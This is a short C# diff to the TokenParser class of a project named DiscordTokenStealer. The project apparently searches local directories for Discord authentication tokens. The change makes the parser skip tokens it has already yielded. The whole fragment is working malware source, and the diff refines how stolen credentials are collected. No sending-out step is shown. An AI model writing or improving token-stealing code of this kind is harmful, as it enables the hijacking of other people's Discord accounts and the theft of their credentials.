@@ -1,4 +1,5 @@
-﻿using System.Reflection;
+﻿using System.Collections.Concurrent;
+using System.Reflection;
 using System.Text.RegularExpressions;
 using DiscordTokenStealer.DirectorySearchProviders;
 
@@ -16,10 +17,14 @@ public static class TokenParser
             if ((IDirectorySearchProvider?) field.GetValue(null) is not {Exists: true} searchProvider)
                 continue;
 
+            var consumedTokens = new ConcurrentBag<string>();
+
             await foreach (var contents in searchProvider.EnumerateContentsAsync())
+            foreach (var token in ParseTokensFromString(contents))
             {
-                foreach (var token in ParseTokensFromString(contents))
-                    yield return token;
+                if (consumedTokens.Contains(token)) continue;
+                yield return token;
+                consumedTokens.Add(token);
             }
         }
     }
